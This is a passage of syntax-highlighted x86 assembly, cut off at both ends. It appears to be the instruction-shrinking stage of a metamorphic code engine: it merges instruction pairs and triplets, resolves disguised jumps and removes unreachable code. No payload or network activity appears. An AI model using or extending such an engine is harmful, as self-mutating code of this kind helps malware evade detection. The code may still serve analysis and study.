                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; If we put 0 here we can treat this as</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@EndCompressed</span><span class="sc0"> </span><span class="sc1">; an special opcode 43h (MOV Mem,Reg)</span><span class="sc0">

      </span><span class="sc5">@@Double_Next30</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ECh</span><span class="sc0">   </span><span class="sc1">; Check CALL Reg + MOV Mem,EAX?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next29_CheckAPICALL_STORE</span><span class="sc0"> </span><span class="sc1">; Check APICALL_STORE</span><span class="sc0">

      </span><span class="sc5">@@Double_Next31</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">42h</span><span class="sc0">    </span><span class="sc1">; MOV Reg,Mem?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next32</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">    </span><span class="sc1">; MOV Reg,Mem + AND Reg,0FF?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next31_MaybeMOVZX</span><span class="sc0"> </span><span class="sc1">; Set MOVZX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">      </span><span class="sc1">; EAX,ECX,EDX? (it only uses these three)</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@Double_Next32</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next32</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ECh</span><span class="sc0">   </span><span class="sc1">; CALL Reg?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next32</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">      </span><span class="sc1">; MOV Reg,Mem + CALL Reg = CALL Mem</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_SetInstruction</span><span class="sc0">
      </span><span class="sc5">@@Double_Next31_MaybeMOVZX</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Check MOVZX. We check if the destiny</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">    </span><span class="sc1">; registers are the same one</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next32</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next32</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">    </span><span class="sc1">; AND Reg,0FF?</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next32</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">     </span><span class="sc1">; Set the register</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next32</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc0">    </span><span class="sc1">; Set MOVZX Reg,byte ptr Mem</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next_SetInstruction</span><span class="sc0">


      </span><span class="sc5">@@Double_Next32</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">39h</span><span class="sc0">     </span><span class="sc1">; CMP Reg,Reg?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_Next33</span><span class="sc0">
        </span><span class="sc5">@@Double_Next32_Common</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc0">     </span><span class="sc1">; CMP Reg,Reg + Jcc @xxx?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Double_End</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@Double_End</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; If source and destiny in CMP aren't</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; the same, it's not a camuflated JMP</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Double_End</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Check flags when we jump for sure</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc0">     </span><span class="sc1">; and when the two instructions do</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; nothing.</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next32_JMP</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next32_JMP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Double_Next32_NOP</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Double_Next32_JMP</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next32_JMP</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next32_JMP</span><span class="sc0">
        </span><span class="sc5">@@Double_Next32_NOP</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">   </span><span class="sc1">; Set NOP in JO,JB,JNZ,JA,JS,JNP,JL,JG</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@EndCompressed</span><span class="sc0">
        </span><span class="sc5">@@Double_Next32_JMP</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">   </span><span class="sc1">; Set JMP in JNO,JAE,JZ,JBE,JNS,JP,JGE,JLE</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
 </span><span class="sc1">; After the jump, we eliminate all the instructions until the next labelled</span><span class="sc0">
 </span><span class="sc1">; instruction. That instructions are never executed, so we NOP them to avoid</span><span class="sc0">
 </span><span class="sc1">; its reassembly.</span><span class="sc0">
        </span><span class="sc5">@@Double_Next32_EliminateNonReachableCode</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressOfLastInstruction</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@EndCompressed</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Check label mark</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@EndCompressed</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Double_Next32_EliminateNonReachableCode</span><span class="sc0">


      </span><span class="sc5">@@Double_Next33</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">39h</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc0">   </span><span class="sc1">; Do the same with CMP Reg8,Reg8</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Double_Next32_Common</span><span class="sc0">

      </span><span class="sc5">@@Double_End</span><span class="sc4">:</span><span class="sc0">


 </span><span class="sc1">;; Here we check triplets of instructions and merge them into one.</span><span class="sc0">
      </span><span class="sc5">@@Check_Triple</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">IncreaseEIP</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressOfLastInstruction</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@EndNoCompressed</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@EndNoCompressed</span><span class="sc0"> </span><span class="sc1">; No compress if a label is pointing</span><span class="sc0">
                                        </span><span class="sc1">; the last instruction</span><span class="sc0">
                </span><span class="sc1">; Check triplet in [edx],[esi],[edi]</span><span class="sc0">

      </span><span class="sc5">@@Triple_Next00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;xor     eax, eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">       </span><span class="sc1">; MOV Mem,Reg?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Triple_Next01</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Check mem operands</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Triple_Next01</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Triple_Next01</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">42h</span><span class="sc0">        </span><span class="sc1">; 3rd instruction == MOV Reg,Mem?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Triple_Next00_Constr00</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc0">        </span><span class="sc1">; 3rd instr. == Jcc?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Triple_Next01</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@Triple_Next01</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc0">      </span><span class="sc1">; Get the comparision</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Triple_Next00_Maybe01</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">       </span><span class="sc1">; SUB?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Triple_Next00_Maybe01</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">       </span><span class="sc1">; CMP?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Triple_Next00_Maybe01</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">       </span><span class="sc1">; TEST?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Triple_Next00_Maybe01</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">       </span><span class="sc1">; AND?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Triple_End</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next00_Maybe01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next00_CheckCMPTEST</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Get the operation being performed</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07Fh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">       </span><span class="sc1">; If test, jump</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Triple_Next00_CheckCMPTEST_00</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">         </span><span class="sc1">; Check if it's OP Reg,Mem</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Triple_Next00_CMPTESTRegReg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Triple_Next00_CheckCMPTEST_01</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next00_CheckCMPTEST_00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">         </span><span class="sc1">; Check if it's OP Mem,Reg</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Triple_Next00_CMPTESTRegReg</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next00_CheckCMPTEST_01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">         </span><span class="sc1">; Check if it's OP Mem,Imm</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Triple_End</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next00_CMPTESTRegImm</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">; Set CMP/TEST Reg,Imm</span><span class="sc0">
              </span><span class="sc1">;  xor     ebx, ebx</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next00_SET_CMPTEST</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">78h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">       </span><span class="sc1">; Check TEST</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Triple_Next00_SetInstruction</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">       </span><span class="sc1">; Check AND</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Triple_Next00_Cont80</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">       </span><span class="sc1">; Check CMP</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Triple_Next00_SetInstruction</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; Check ADD (maybe is a conversion</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Triple_Next00_NegateImm</span><span class="sc0">  </span><span class="sc1">; of SUB Reg,Imm)</span><span class="sc0">
        </span><span class="sc5">@@Triple_Next00_SetCMP</span><span class="sc4">:</span><span class="sc0">
